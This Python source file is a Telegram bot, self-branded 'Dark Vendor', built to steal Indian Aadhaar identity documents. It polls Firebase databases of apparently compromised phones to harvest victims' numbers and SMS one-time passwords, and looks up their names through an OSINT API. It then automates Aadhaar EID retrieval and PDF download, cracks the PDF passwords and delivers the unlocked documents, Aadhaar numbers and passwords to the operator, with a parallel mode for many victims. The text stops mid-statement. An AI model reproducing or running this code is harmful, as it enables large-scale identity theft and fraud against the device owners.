import asyncio
import os
import re
import subprocess
import base64
import ddddocr
import random
import uuid
import sys
import threading
import time
import gc
from dotenv import load_dotenv
import stats_manager

# Load environmental variables from .env file
load_dotenv()

# Force all spawned python subprocesses to use UTF-8 output encoding
os.environ['PYTHONIOENCODING'] = 'utf-8'

DEVELOPER_USERNAME = os.getenv('DEVELOPER_USERNAME', 'DARKVENDOR07')

def escape_html(s):
    return str(s or '').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

def get_ui_card(step_num, title, description, target=None, show_tip=True):
    body = ""
    if step_num:
        body += f"📱 <b>STEP {step_num}/4: {title}</b>\n\n"
    else:
        body += f"⭐ <b>{title}</b>\n\n"
    body += f"{description}\n"
    if target:
        body += "\n━━━━━━━━━━━━━━━━━━━━━━\n"
        body += f"📱 <b>Target Mobile:</b> <code>{target}</code>\n"
    if show_tip:
        body += (
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 <i>Tip: Send <b>/cancel</b> to abort.</i>"
        )
    else:
        body += "━━━━━━━━━━━━━━━━━━━━━━"
    return body


# ==============================================================================
# 🔥 FIREBASE STATE + HELPERS (bb_auto.py style)
# ==============================================================================
firebase_dbs = []              # list of {"url": str, "auth": str}
firebase_lock = threading.Lock()
used_numbers = set()
used_lock = threading.Lock()

NAME_API = "https://sarkariupdate.online/osint/APIX.php?api=num_api&q="

# Global Registry for Interactivity
user_page_registry = {}
buffered_inputs = {}
_engine_instance = None
_running_loop = None
active_engines = {}
active_tasks = set()
VISIBLE_MODE = {}
CRACKED_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cracked_aadhar")
os.makedirs(CRACKED_DIR, exist_ok=True)

STICKERS = {
    "SUCCESS": "CAACAgIAAxkBAAEL6V9mAe7q-Q1R-O_0v57_5y7X-Q5_QAACSwADr8ZRGm_F-G7M7_9kNAQ"
}


def parse_dob(date_str):
    if not date_str: return date_str
    months_map = {
        'jan': '01', 'feb': '02', 'mar': '03', 'apr': '04', 'may': '05', 'jun': '06',
        'jul': '07', 'aug': '08', 'sep': '09', 'oct': '10', 'nov': '11', 'dec': '12'
    }
    clean = date_str.replace(',', '').strip()
    parts = re.split(r'[ /\-.]', clean)
    if len(parts) < 3:
        return date_str
    day, month, year = None, None, None
    if len(parts[0]) == 4:
        year = parts[0]; month = parts[1]; day = parts[2]
    elif len(parts[2]) == 4:
        day = parts[0]; month = parts[1]; year = parts[2]
    else:
        day, month, year = parts[0], parts[1], parts[2]
    m_lower = str(month).lower()[:3]
    if m_lower in months_map:
        month = months_map[m_lower]
    try:
        return f"{str(day).zfill(2)}-{str(month).zfill(2)}-{year}"
    except:
        return date_str


def _parse_firebase_line(raw_line):
    """Return (url, auth) tuple or None."""
    line = raw_line.strip().strip('\ufeff')
    if not line or line.startswith('#'):
        return None
    if 'firebaseio.com' not in line and 'firebasedatabase.app' not in line:
        return None
    if not line.startswith('http'):
        line = 'https://' + line
    url = line
    auth = ""
    if ':' in url and '://' in url:
        scheme, rest = url.split('://', 1)
        if ':' in rest:
            host_part, maybe_auth = rest.rsplit(':', 1)
            if (maybe_auth and '/' not in maybe_auth and '?' not in maybe_auth
                    and len(maybe_auth) < 64
                    and ('firebaseio.com' in host_part or 'firebasedatabase.app' in host_part)):
                url = f"{scheme}://{host_part}"
                auth = maybe_auth
    return (url.rstrip('/'), auth)


def fb_url(db, path):
    base = db['url'].rstrip('/')
    auth = db.get('auth', '')
    full = f"{base}/{path}"
    if auth:
        sep = '&' if '?' in full else '?'
        full = f"{full}{sep}auth={auth}"
    return full


def _extract_phone_from_dict(msgs_dict):
    """bb_auto.py style — stringify the whole dict and regex for a 10-digit mobile."""
    if not msgs_dict:
        return None
    text_data = str(msgs_dict)
    m = re.search(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text_data)
    return m.group(1) if m else None


def _is_online(cdata):
    """bb_auto.py style — strictly `status is True`."""
    return isinstance(cdata, dict) and cdata.get("status") is True


def fb_scan():
    """Scan all Firebase DBs → list of online devices with phone.
    Uses bb_auto.py detection logic:
      - GET /clients.json  (full dict)
      - filter cdata.get("status") is True
      - for each online id, GET /messages/<cid>.json?orderBy="$key"&limitToLast=30
      - extract phone by regex from str(messages_dict)
    Returns list of dicts: {url, auth, cid, phone}
    """
    with firebase_lock:
        dbs = list(firebase_dbs)

    results = []
    for db in dbs:
        try:
            r = requests_get(fb_url(db, "clients.json"), timeout=12)
            if r is None:
                continue
            clients = r
            if not isinstance(clients, dict):
                continue

            online_ids = [cid for cid, cdata in clients.items() if _is_online(cdata)]
            del clients
            gc.collect()

            if not online_ids:
                continue

            seen = set()
            for cid in online_ids:
                try:
                    url = fb_url(db, f'messages/{cid}.json?orderBy=%22%24key%22&limitToLast=30')
                    msgs = requests_get(url, timeout=8)
                    if msgs is None:
                        continue
                    phone = _extract_phone_from_dict(msgs)
                    if phone and phone not in seen:
                        with used_lock:
                            if phone in used_numbers:
                                continue
                        seen.add(phone)
                        results.append({
                            "url": db['url'],
                            "auth": db.get('auth', ''),
                            "cid": cid,
                            "phone": phone,
                        })
                except Exception:
                    continue
        except Exception as e:
            print(f"[SCAN] {db['url'][:40]}: {e}")
            continue
    return results


import requests as _requests


def requests_get(url, timeout=10):
    """Small sync HTTP helper (used by fb_scan for both aiohttp-free use)."""
    try:
        r = _requests.get(url, timeout=timeout)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None


def fb_msgids(db, cid):
    """Return set of message keys currently in /messages/<cid>."""
    try:
        url = fb_url(db, f"messages/{cid}.json?shallow=true")
        j = requests_get(url, timeout=8)
        if isinstance(j, dict):
            return set(j.keys())
    except Exception:
        pass
    return set()


def fb_poll_otp(db, cid, existing_keys, timeout=60,
                require_keywords=None, exclude_keywords=None):
    """Poll /messages/<cid> for a new 6-digit OTP. Returns (otp, body) or (None, '')."""
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            url = fb_url(db, f'messages/{cid}.json?orderBy=%22%24key%22&limitToLast=30')
            j = requests_get(url, timeout=8)
            if isinstance(j, dict):
                for mid, md in sorted(j.items(), reverse=True):
                    if mid in existing_keys:
                        continue
                    if not isinstance(md, dict):
                        continue
                    body = str(md.get("message", "") or md.get("body", "") or
                               md.get("msg", "") or md.get("text", "") or "")
                    bl = body.lower()
                    if require_keywords and not any(k.lower() in bl for k in require_keywords):
                        continue
                    if exclude_keywords and any(k.lower() in bl for k in exclude_keywords):
                        continue
                    for o in re.findall(r'\b(\d{6})\b', body):
                        if o not in ("000000", "123456", "111111", "999999"):
                            return o, body
        except Exception:
            pass
        time.sleep(3)
    return None, ""


# ==============================================================================
# ⚙️ AADHAAR ENGINE (existing functionality + a new parallel auto flow)
# ==============================================================================
async def init_pool(bot_instance):
    global _running_loop
    _running_loop = asyncio.get_running_loop()


class AadhaarEngine:
    def __init__(self, bot, chat_id=None):
        self.bot = bot
        self.chat_id = str(chat_id) if chat_id else None
        self.ocr = ddddocr.DdddOcr(show_ad=False)
        self.status_msg_id = None
        self._preloader_active = False
        self._preloader_task = None
        self.temp_msg_ids = []

    def update_status(self, text):
        if not self.chat_id or self.chat_id == "master":
            return
        footer = f"\n━━━━━━━━━━━━━━━━━━━━━━\n<i>Dev: @{DEVELOPER_USERNAME} | Dark Vendor</i>"
        if self.status_msg_id:
            try:
                self.bot.edit_message_text(chat_id=self.chat_id, message_id=self.status_msg_id,
                                           text=f"{text}{footer}", parse_mode='HTML')
            except:
                pass
        else:
            try:
                msg = self.bot.send_message(self.chat_id, f"{text}{footer}", parse_mode='HTML')
                self.status_msg_id = msg.message_id
                try:
                    if int(self.chat_id) < 0:
                        self.temp_msg_ids.append(self.status_msg_id)
                except:
                    pass
            except:
                pass

    def refresh_status_card(self, text):
        if not self.chat_id or self.chat_id == "master":
            return
        if self.status_msg_id:
            try:
                self.bot.delete_message(chat_id=self.chat_id, message_id=self.status_msg_id)
            except:
                pass
            self.status_msg_id = None
        self.update_status(text)

    def start_preloader(self, base_text):
        self.stop_preloader()
        self._preloader_active = True
        self.preloader_base_text = base_text
        global _running_loop
        target_loop = _running_loop or asyncio.get_event_loop()
        self._preloader_task = target_loop.create_task(self._preloader_loop())

    def stop_preloader(self):
        self._preloader_active = False
        if hasattr(self, '_preloader_task') and self._preloader_task:
            try:
                self._preloader_task.cancel()
            except:
                pass
            self._preloader_task = None

    async def _preloader_loop(self):
        spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        bars = [
            "▒░░░░░░░░░", "█▒░░░░░░░░", "██▒░░░░░░░", "███▒░░░░░░",
            "████▒░░░░░", "█████▒░░░░", "██████▒░░░", "███████▒░░",
            "████████▒░", "█████████▒", "██████████"
        ]
        idx = 0
        bar_idx = 0
        direction = 1
        while self._preloader_active:
            try:
                spin = spinner[idx % len(spinner)]
                bar = bars[bar_idx]
                bar_idx += direction
                if bar_idx >= len(bars) or bar_idx < 0:
                    direction *= -1
                    bar_idx += direction
                base_text = getattr(self, 'preloader_base_text', '⏳ Processing...')
                full_text = f"{base_text}\n━━━━━━━━━━━━━━━━━━━━━━\n{spin} <b>{bar}</b>"
                footer = f"\n━━━━━━━━━━━━━━━━━━━━━━\n<i>Dev: @{DEVELOPER_USERNAME} | Dark Vendor</i>"
                if self.status_msg_id:
                    try:
                        self.bot.edit_message_text(
                            chat_id=self.chat_id,
                            message_id=self.status_msg_id,
                            text=f"{full_text}{footer}",
                            parse_mode='HTML'
                        )
                    except:
                        pass
                idx += 1
                await asyncio.sleep(1.2)
            except asyncio.CancelledError:
                break
            except Exception:
                await asyncio.sleep(2)

    async def close(self):
        if self.chat_id == 'master':
            for uid, eng in list(active_engines.items()):
                try:
                    await eng.close()
                except:
                    pass
            active_engines.clear()
            active_tasks.clear()
        try:
            if hasattr(self, 'phase1_process') and self.phase1_process:
                try:
                    self.phase1_process.terminate()
                except:
                    pass
                self.phase1_process = None
            if hasattr(self, 'phase1_task') and self.phase1_task:
                try:
                    self.phase1_task.cancel()
                except:
                    pass
                self.phase1_task = None
        except Exception as e:
            print(f"⚠️ [ENGINE] shutdown: {e}")

    async def delete_temp_messages(self):
        if not self.chat_id:
            return
        try:
            chat_id_int = int(self.chat_id)
        except ValueError:
            return
        if chat_id_int < 0:
            for msg_id in list(self.temp_msg_ids):
                try:
                    self.bot.delete_message(chat_id=chat_id_int, message_id=msg_id)
                except Exception as e:
                    print(f"⚠️ [CLEANUP] {msg_id}: {e}")
            self.temp_msg_ids.clear()

    def start_early_phase1(self, mobile):
        if hasattr(self, 'phase1_process') and self.phase1_process:
            return
        self.phase1_ready = asyncio.Event()
        self.phase1_mobile = mobile
        global _running_loop
        if _running_loop:
            self.phase1_task = _running_loop.create_task(self._early_phase1_loop(mobile))

    async def _early_phase1_loop(self, mobile):
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            get_eid_script = os.path.join(script_dir, 'retrive-eid.py')
            self.phase1_process = await asyncio.create_subprocess_exec(
                sys.executable, '-u', get_eid_script, "WAIT_INPUT", "WAIT_INPUT", mobile,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            while True:
                line_bytes = await self.phase1_process.stdout.readline()
                if not line_bytes:
                    break
                line = line_bytes.decode('utf-8', errors='ignore').strip()
                print(f"[get_eid prewarm {self.chat_id}] {line}")
                if "🔑 WAITING_FOR_NAME_DOB" in line:
                    self.phase1_ready.set()
                    break
        except Exception as e:
            print(f"⚠️ [PRE-WARM] {e}")
            if hasattr(self, 'phase1_process') and self.phase1_process:
                try:
                    self.phase1_process.terminate()
                except:
                    pass
                self.phase1_process = None

    async def wait_for_input(self, chat_id, prompt_type, timeout=300):
        str_chat_id = str(chat_id)
        if str_chat_id in buffered_inputs:
            val = buffered_inputs.pop(str_chat_id)
            if val == '__CANCEL__':
                raise Exception("Process cancelled by user.")
            return val
        user_page_registry[str_chat_id] = {'type': prompt_type, 'value': None}
        try:
            for _ in range(timeout):
                if str_chat_id in buffered_inputs:
                    val = buffered_inputs.pop(str_chat_id)
                    if val == '__CANCEL__':
                        raise Exception("Process cancelled by user.")
                    return val
                if user_page_registry.get(str_chat_id) and user_page_registry[str_chat_id]['value'] is not None:
                    val = user_page_registry[str_chat_id]['value']
                    user_page_registry.pop(str_chat_id, None)
                    if val == '__CANCEL__':
                        raise Exception("Process cancelled by user.")
                    return val
                await asyncio.sleep(1)
            raise Exception(f"Timeout waiting for {prompt_type}")
        finally:
            user_page_registry.pop(str_chat_id, None)

    async def run_flow(self, chat_id, name, mobile, dob, user_info=None):
        self.start_time = time.time()
        self.start_preloader(f"📱 <b>STEP 3/4: EID Retrieval</b>\n\n⏳ <b>Retrieving EID details...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")

        script_dir = os.path.dirname(os.path.abspath(__file__))
        get_eid_script = os.path.join(script_dir, 'retrive-eid.py')

        formatted_dob_iso = dob
        found_id = None
        process = None
        use_prewarmed = False
        if hasattr(self, 'phase1_process') and self.phase1_process:
            if getattr(self, 'phase1_mobile', None) == mobile and self.phase1_process.returncode is None:
                use_prewarmed = True

        captured_real_name = name
        try:
            if use_prewarmed:
                self.update_status("🔍 <b>PHASE 1: Retrieving ID...</b>\n⚡ <i>Using pre-warmed EID retrieval browser...</i>")
                try:
                    await asyncio.wait_for(self.phase1_ready.wait(), timeout=15.0)
                except asyncio.TimeoutError:
                    use_prewarmed = False

            if use_prewarmed and self.phase1_process and self.phase1_process.returncode is None:
                process = self.phase1_process
                process.stdin.write(f"{name}|{formatted_dob_iso}\n".encode('utf-8'))
                await process.stdin.drain()
            else:
                if hasattr(self, 'phase1_process') and self.phase1_process:
                    try:
                        self.phase1_process.terminate()
                    except:
                        pass
                    self.phase1_process = None
                process = await asyncio.create_subprocess_exec(
                    sys.executable, '-u', get_eid_script, name, str(formatted_dob_iso), mobile,
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )

            while True:
                line_bytes = await process.stdout.readline()
                if not line_bytes:
                    break
                line = line_bytes.decode('utf-8', errors='ignore').strip()
                print(f"[get_eid] {line}")

                if "Trying name payload:" in line:
                    self.preloader_base_text = (
                        f"📱 <b>STEP 3/4: EID Retrieval</b>\n\n"
                        f"🔍 <b>Searching database...</b>\n\n"
                        f"📱 <b>Target Mobile:</b> <code>{mobile}</code>"
                    )
                if "Navigation attempt" in line:
                    self.update_status(f"⚠️ <b>Portal response slow!</b> {escape_html(line)}. Kripya wait karein...")
                if "LIMIT CROSSED" in line:
                    raise Exception("Technical difficulties / Rate limit reached. Limit crossed, try again later.")
                if "NETWORK ERROR" in line:
                    raise Exception("Network issue / slow portal response.")
                if "OTP Sent Successfully" in line:
                    self.stop_preloader()
                    self.update_status(get_ui_card(
                        step_num="3", title="OTP 1 Verification",
                        description="🚀 <b>OTP 1 Sent Successfully!</b>\n👇 Kripya niche chat me <b>OTP</b> type karein:",
                        target=mobile
                    ))
                if line.startswith("🔑 MANUAL CAPTCHA REQUIRED |"):
                    b64_img = line.split("🔑 MANUAL CAPTCHA REQUIRED |")[1].strip()
                    self.stop_preloader()
                    temp_path = os.path.join(script_dir, f"temp_captcha_p1_{chat_id}.png")
                    with open(temp_path, "wb") as f_cap:
                        f_cap.write(base64.b64decode(b64_img.encode()))
                    with open(temp_path, "rb") as f_photo:
                        photo_msg = self.bot.send_photo(
                            chat_id, f_photo,
                            caption="⚠️ <b>Auto-Captcha solve failed!</b>\n👇 Kripya image me dikh raha captcha code manually type karein:",
                            parse_mode='HTML'
                        )
                    user_captcha_val = await self.wait_for_input(chat_id, 'CAPTCHA')
                    self.start_preloader(f"📱 <b>STEP 3/4: EID Retrieval</b>\n\n⏳ <b>Submitting Captcha...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
                    try:
                        os.remove(temp_path)
                    except:
                        pass
                    process.stdin.write(f"{user_captcha_val}\n".encode())
                    await process.stdin.drain()
                if "ENTER THE OTP RECEIVED ON YOUR REGISTERED MOBILE" in line:
                    res_otp = await self.wait_for_input(chat_id, 'OTP')
                    self.refresh_status_card(f"📱 <b>STEP 3/4: OTP 1 Verification</b>\n\n⏳ <b>Submitting OTP 1...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
                    self.start_preloader(f"📱 <b>STEP 3/4: OTP 1 Verification</b>\n\n⏳ <b>Submitting OTP 1...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
                    process.stdin.write(f"{res_otp}\n".encode())
                    await process.stdin.drain()
                if "CAPTURED ID SUCCESSFULLY:" in line:
                    found_id = line.split("CAPTURED ID SUCCESSFULLY:")[1].strip()
                    found_id = re.sub(r'[^a-zA-Z0-9]', '', found_id)
                if "CAPTURED NAME SUCCESSFULLY:" in line:
                    captured_real_name = line.split("CAPTURED NAME SUCCESSFULLY:")[1].strip()

            await process.wait()

            if not found_id:
                stderr_bytes = await process.stderr.read()
                stderr_str = stderr_bytes.decode('utf-8', errors='ignore').strip()
                if stderr_str:
                    print(f"[get_eid error] {stderr_str}")
                    if "An error occurred:" in stderr_str:
                        raise Exception(stderr_str.split("An error occurred:")[1].strip())
                    if "You have entered an invalid Captcha" in stderr_str:
                        raise Exception("Invalid Captcha! Please try again.")
                    if "experiencing technical difficulties" in stderr_str.lower():
                        raise Exception("Technical difficulties / Rate limit reached.")
                    last_err = [l for l in stderr_str.splitlines() if l.strip()][-1]
                    raise Exception(last_err)
                raise Exception("Aadhaar details galat hain ya portal response match nahi ho raha.")

        except Exception as e:
            self.stop_preloader()
            if process:
                try:
                    process.terminate()
                except:
                    pass
            raise e

        if found_id:
            self.stop_preloader()
            await self.run_uidai_phase(chat_id, found_id, captured_real_name, mobile, user_info=user_info)

    async def run_uidai_phase(self, chat_id, eid, name, mobile, user_info=None):
        self.start_preloader(f"📱 <b>STEP 4/4: Aadhaar Download</b>\n\n⏳ <b>Fetching Aadhaar PDF...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
        script_dir = os.path.dirname(os.path.abspath(__file__))
        download_script = os.path.join(script_dir, 'aadhar-downlaod.py')

        max_retries = 3
        current_retry = 0
        while current_retry < max_retries:
            process = None
            try:
                process = await asyncio.create_subprocess_exec(
                    sys.executable, '-u', download_script, str(eid), str(chat_id),
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                while True:
                    line_bytes = await process.stdout.readline()
                    if not line_bytes:
                        break
                    line = line_bytes.decode('utf-8', errors='ignore').strip()
                    print(f"[aadhar-downlaod] {line}")
                    if "Decoded Captcha:" in line:
                        solved_cap = line.split("Decoded Captcha:")[1].strip()
                        self.update_status(f"🧩 <b>Captcha Solved:</b> <code>{solved_cap}</code>. Requesting OTP...")
                    if "✅ OTP Sent Successfully!" in line:
                        self.stop_preloader()
                        self.update_status(get_ui_card(
                            step_num="4", title="OTP 2 Verification",
                            description="✅ <b>OTP 2 Sent Successfully!</b>\n👇 Kripya niche chat me <b>OTP</b> type karein:",
                            target=mobile
                        ))
                    if line.startswith("🔑 MANUAL CAPTCHA REQUIRED |"):
                        b64_img = line.split("🔑 MANUAL CAPTCHA REQUIRED |")[1].strip()
                        self.stop_preloader()
                        temp_path = os.path.join(script_dir, f"temp_captcha_p2_{chat_id}.png")
                        with open(temp_path, "wb") as f_cap:
                            f_cap.write(base64.b64decode(b64_img.encode()))
                        with open(temp_path, "rb") as f_photo:
                            self.bot.send_photo(
                                chat_id, f_photo,
                                caption="⚠️ <b>Auto-Captcha solve failed!</b>\n👇 Kripya image me dikh raha captcha code manually type karein:",
                                parse_mode='HTML'
                            )
                        user_captcha_val = await self.wait_for_input(chat_id, 'CAPTCHA')
                        self.start_preloader(f"📱 <b>STEP 4/4: Aadhaar Download</b>\n\n⏳ <b>Submitting Captcha...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
                        try:
                            os.remove(temp_path)
                        except:
                            pass
                        process.stdin.write(f"{user_captcha_val}\n".encode())
                        await process.stdin.drain()
                    if "ENTER THE OTP RECEIVED ON YOUR REGISTERED MOBILE" in line:
                        res_otp = await self.wait_for_input(chat_id, 'OTP')
                        self.refresh_status_card(f"📱 <b>STEP 4/4: OTP 2 Verification</b>\n\n⏳ <b>Submitting OTP 2...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
                        self.start_preloader(f"📱 <b>STEP 4/4: OTP 2 Verification</b>\n\n⏳ <b>Submitting OTP 2...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
                        process.stdin.write(f"{res_otp}\n".encode())
                        await process.stdin.drain()
                        self.start_preloader(f"📱 <b>STEP 4/4: Aadhaar Download</b>\n\n📥 <b>Downloading File...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
                await process.wait()

                file_path = os.path.join(CRACKED_DIR, f"Aadhaar_{chat_id}.pdf")
                if os.path.exists(file_path):
                    await self.process_cracked_pdf(chat_id, file_path, name, mobile, eid=eid, user_info=user_info)
                    return
                else:
                    stderr_bytes = await process.stderr.read()
                    stderr_str = stderr_bytes.decode('utf-8', errors='ignore').strip()
                    if stderr_str:
                        print(f"[aadhar-downlaod error] {stderr_str}")
                        if "An error occurred:" in stderr_str:
                            raise Exception(stderr_str.split("An error occurred:")[1].strip())
                        last_err = [l for l in stderr_str.splitlines() if l.strip()][-1]
                        raise Exception(last_err)
                    raise Exception("Aadhaar download failed. EID details incorrect or invalid OTP.")
            except Exception as e:
                self.stop_preloader()
                if process:
                    try:
                        process.terminate()
                    except:
                        pass
                err_msg = str(e)
                if "technical difficulties" in err_msg.lower():
                    raise e
                is_otp_error = "invalid otp" in err_msg.lower() or "incorrect otp" in err_msg.lower()
                current_retry += 1
                if current_retry < max_retries:
                    self.update_status(f"⚠️ <b>Error:</b> {escape_html(str(e))}\n🔄 <i>Retrying...</i>")
                    await asyncio.sleep(2)
                else:
                    if is_otp_error:
                        raise Exception("❌ Invalid OTP. Max retries exceeded.")
                    raise Exception(f"Registry Phase Failed: {e}")

    async def process_cracked_pdf(self, chat_id, file_path, name, mobile, eid=None, user_info=None):
        self.start_preloader("🔓 <b>File Downloaded!</b> Unlocking PDF...")
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            proc_script = os.path.join(script_dir, 'pdf_processor.py')
            os.makedirs(CRACKED_DIR, exist_ok=True)
            process = await asyncio.create_subprocess_exec(
                sys.executable, proc_script, file_path, name, CRACKED_DIR, str(chat_id), 'True',
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            stdout_str = stdout.decode('utf-8', errors='ignore')
            stderr_str = stderr.decode('utf-8', errors='ignore').strip()

            if stdout_str.strip():
                print(f"[pdf_processor stdout] {stdout_str.strip()}")
            if stderr_str:
                print(f"[pdf_processor stderr] {stderr_str}")

            success_line = None
            uncracked_line = None
            error_line = None
            for line in stdout_str.split('\n'):
                line = line.strip()
                if line.startswith('SUCCESS|'):
                    success_line = line; break
                if line.startswith('UNCRACKED|'):
                    uncracked_line = line; break
                if line.startswith('ERROR|'):
                    error_line = line[6:]

            if success_line:
                self.stop_preloader()
                parts = success_line.split('|', 5)
                if len(parts) < 6:
                    raise Exception("Malformed SUCCESS line.")
                _, uid, pdf_out, front, back, password = parts

                time_str = "<b>N/A</b>"
                if hasattr(self, 'start_time') and self.start_time:
                    elapsed_sec = int(time.time() - self.start_time)
                    m = elapsed_sec // 60; s = elapsed_sec % 60
                    time_str = f"<b>{m} min {s} sec</b>" if m > 0 else f"<b>{s} sec</b>"

                success_text = (
                    f"🎉 <b>Success! Aadhaar Cracked.</b>\n\n"
                    f"👤 <b>Name:</b> <code>{name}</code>\n"
                    f"🆔 <b>EID:</b> <code>{eid or 'N/A'}</code>\n"
                    f"🔢 <b>Aadhaar Number:</b> <code>{uid}</code>\n"
                    f"🔑 <b>Password:</b> <code>{password}</code>\n\n"
                    f"⏱️ <b>Time Taken:</b> {time_str}"
                )
                self.bot.send_message(chat_id, success_text, parse_mode='HTML')
                try:
                    stats_manager.record_success(chat_id, user_info, name, mobile, uid, password, eid=eid)
                except Exception as se:
                    print(f"⚠️ [STATS] {se}")
                try:
                    import shutil
                    safe_name = "".join(c for c in name if c.isalnum() or c in (' ', '_', '-')).strip().replace(' ', '_')
                    safe_uid = uid.replace(' ', '')
                    permanent_pdf = os.path.join(CRACKED_DIR, f"{safe_name}_{safe_uid}.pdf")
                    shutil.copy(pdf_out, permanent_pdf)
                    print(f"💾 [SAVED PDF] {permanent_pdf}")
                except Exception as e_copy:
                    print(f"⚠️ [SAVED PDF] {e_copy}")

                self.update_status("📤 <b>Sending Aadhaar files...</b>")
                for f_path, cap in [(front, "🖼️ <b>Aadhaar Front</b>"), (back, "🖼️ <b>Aadhaar Back</b>")]:
                    try:
                        if os.path.exists(f_path):
                            with open(f_path, 'rb') as f:
                                self.bot.send_photo(chat_id, f, caption=cap, parse_mode='HTML')
                    except Exception as e_f:
                        print(f"⚠️ {e_f}")
                try:
                    if os.path.exists(pdf_out):
                        with open(pdf_out, 'rb') as f:
                            self.bot.send_document(chat_id, f, caption="📄 <b>Aadhaar PDF (Unlocked)</b>")
                except Exception as e_p:
                    print(f"⚠️ {e_p}")

                self.update_status(f"✅ <b>Process Completed!</b>\nAadhaar data has been sent above.")
                for tmp in [front, back, pdf_out, file_path]:
                    if tmp and os.path.exists(tmp):
                        try:
                            os.remove(tmp)
                        except:
                            pass
                return

            if uncracked_line:
                self.stop_preloader()
                parts = uncracked_line.split('|', 1)
                locked_pdf = parts[1] if len(parts) > 1 else file_path
                uncracked_text = (
                    f"⚠️ <b>Aadhaar Crack Failed!</b>\n\n"
                    f"👤 <b>Name:</b> <code>{name}</code>\n"
                    f"🆔 <b>EID:</b> <code>{eid or 'N/A'}</code>\n"
                    f"🔑 <b>Password:</b> <code>Not Found</code>\n\n"
                    f"ℹ️ <i>Sending original locked PDF. Password = Name first 4 UPPER + YoB</i>"
                )
                self.bot.send_message(chat_id, uncracked_text, parse_mode='HTML')
                try:
                    stats_manager.record_failure()
                except:
                    pass
                self.update_status("📤 <b>Sending Locked Aadhaar PDF...</b>")
                try:
                    if os.path.exists(locked_pdf):
                        with open(locked_pdf, 'rb') as f:
                            self.bot.send_document(chat_id, f, caption="📄 <b>Aadhaar PDF (Locked)</b>")
                except Exception as e_p:
                    print(f"⚠️ {e_p}")
                self.update_status(f"✅ <b>Process Completed!</b>")
                if os.path.exists(file_path):
                    try:
                        os.remove(file_path)
                    except:
                        pass
                return

            if error_line:
                raise Exception(f"PDF Error: {error_line}")
            elif stderr_str:
                last_err = [l for l in stderr_str.splitlines() if l.strip()][-1] if stderr_str else "Unknown"
                raise Exception(f"PDF Processor crashed: {last_err}")
            else:
                raise Exception("PDF Cracking failed — password not found.")

        except Exception as e:
            self.stop_preloader()
            self.update_status(f"❌ <b>PDF Crack Error:</b> {escape_html(str(e))}")


# ==============================================================================
# 🚀 AUTO WORKER (parallel, for /auto command)
# ==============================================================================
async def auto_worker_parallel(bot, chat_id, count):
    """Parallel auto-OTP worker. Uses fb_scan to find online devices,
    then spawns one engine per device concurrently.
    """
    with firebase_lock:
        dbc = len(firebase_dbs)
    if dbc == 0:
        bot.send_message(chat_id,
            f"<b>{'⚡ Auto-OTP Bot'}</b>\n━━━━━━━━━━━━━━━\n"
            f"✗ No Firebase DBs!\n<i>Use /addfire URL</i>",
            parse_mode='HTML')
        return

    bot.send_message(chat_id,
        f"<b>⚡ Auto-OTP Bot</b>\n━━━━━━━━━━━━━━━\n"
        f"<b>〔 🚀 AUTO-OTP Started 〕</b>\n\n"
        f"◈ Target · {count} PDFs\n"
        f"◈ Firebase · {dbc} DBs\n"
        f"◈ Proxies · {len(__import__('proxy_loader').load_proxies())}\n"
        f"<i>◌ Scanning...</i>",
        parse_mode='HTML')

    devs = await asyncio.to_thread(fb_scan)
    if not devs:
        bot.send_message(chat_id,
            f"<b>⚡ Auto-OTP Bot</b>\n━━━━━━━━━━━━━━━\n✗ No online devices.",
            parse_mode='HTML')
        return

    selected = devs[:count]
    bot.send_message(chat_id,
        f"<b>⚡ Auto-OTP Bot</b>\n━━━━━━━━━━━━━━━\n"
        f"<b>📱 {len(selected)} Devices</b>\n"
        f"◈ Processing in <b>parallel</b>...",
        parse_mode='HTML')

    # Build one engine per device and launch all in parallel
    tasks = []
    for dev in selected:
        tasks.append(asyncio.create_task(_process_one_device(bot, chat_id, dev)))

    # Wait for all to finish (with timeout)
    results = await asyncio.gather(*tasks, return_exceptions=True)

    succ = sum(1 for r in results if r is True)
    fail = len(results) - succ
    bot.send_message(chat_id,
        f"<b>⚡ Auto-OTP Bot</b>\n━━━━━━━━━━━━━━━\n"
        f"<b>🏁 Complete</b>\n\n"
        f"◈ Processed · {len(selected)}\n"
        f"◈ Success · {succ} ✅\n"
        f"◈ Failed · {fail} ❌\n\n"
        f"<i>/auto again | /resetused</i>",
        parse_mode='HTML')


async def _process_one_device(bot, chat_id, dev):
    """Process a single discovered device (fire-and-forget style)."""
    phone = dev["phone"]
    cid = dev["cid"]
    db = {"url": dev["url"], "auth": dev.get("auth", "")}

    with used_lock:
        if phone in used_numbers:
            return False
        used_numbers.add(phone)

    # Fetch name
    name = "MR"
    try:
        def _fetch():
            r = _requests.get(f"{NAME_API}{phone}", timeout=8)
            if r.status_code == 200:
                fn = r.json().get('name', '').strip()
                if fn and fn.lower() not in ['unknown', 'n/a', '']:
                    return fn.upper()
            return "MR"
        name = await asyncio.to_thread(_fetch)
    except:
        pass

    bot.send_message(chat_id,
